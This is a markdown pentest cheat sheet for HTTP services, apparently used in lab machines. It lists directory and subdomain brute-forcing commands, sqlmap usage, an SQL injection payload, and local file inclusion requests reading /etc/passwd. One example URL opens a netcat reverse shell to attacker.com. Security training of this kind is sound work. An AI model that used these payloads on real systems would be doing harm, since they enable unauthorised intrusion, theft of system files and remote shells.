---
title: Port 80 - HTTP
draft: false
tags:
  - http
  - directory-bruteforce
  - wappalyzer
  - subdomain-bruteforce
  - lfi
  - sqli
---
## Directory Bruteforce

Perform directory bruteforce as such:

`sudo feroxbuster -u http://10.10.10.84 -n -x php -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`

![](https://i.imgur.com/lzQ8C4L.png)


Check what extensions webpage is using by accessing such file as **index.php** or **index.html**.

Set appropriate extension with **-x** flag.

When on Windows machine -> Use lower case directory list.

When on IIS machine -> Use IIS specific wordlist.

## Subdomain Bruteforce

Perform Subdomain bruteforcing and add newly discovered subdomains to **/etc/hosts**:

`gobuster vhost -u http://analytical.htb --append-domain -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -o gobuster-vhost`


## SQLi

### SQLmap

`sqlmap -r admin-cronos-htb-login-req.txt --batch`

![](https://i.imgur.com/cZPXbyU.png)


### Manual Testing

Example:

```sql
' or 1=1-- -
```
## LFI

`http://10.10.10.84/browse.php?file=../../../../../../../etc/passwd`

![](https://i.imgur.com/0bnt99B.png)

### Examples

```
http://example.com/index.php?page=/etc/passwd&cmd=id
http://example.com/index.php?page=/var/log/apache/access.log&cmd=nc%20-e%20/bin/bash%20attacker.com%204444
http://example.com/index.php?page=php://input&cmd=cat%20/etc/passwd
```
